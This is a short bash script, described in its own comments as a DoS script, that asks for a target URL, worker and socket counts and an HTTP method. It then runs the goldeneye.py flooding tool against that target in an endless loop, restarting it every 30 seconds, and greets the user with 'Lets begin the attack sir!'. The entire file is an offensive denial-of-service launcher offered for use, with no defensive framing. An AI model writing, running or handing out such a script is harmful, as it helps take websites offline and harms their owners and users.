#!/bin/bash
#dos script to add delay to connections
#
#comment out this next part if you want to staticaly set your targets
echo "Lets begin the attack sir!"
read -p "Please enter the url of your host: " url
read -p "enter the amount of workers that you'd like: " workers
read -p "enter the amount of sockets that you'd like: " sockets
read -p "post, get, or random: " method
#
# This is the while loop that will execute the command
while [[ 0 -eq 0 ]]; do
	echo "Close Terminal to exit"
	timeout 30 python goldeneye.py $url -w $workers -s $sockets -m $method
	sleep 5
done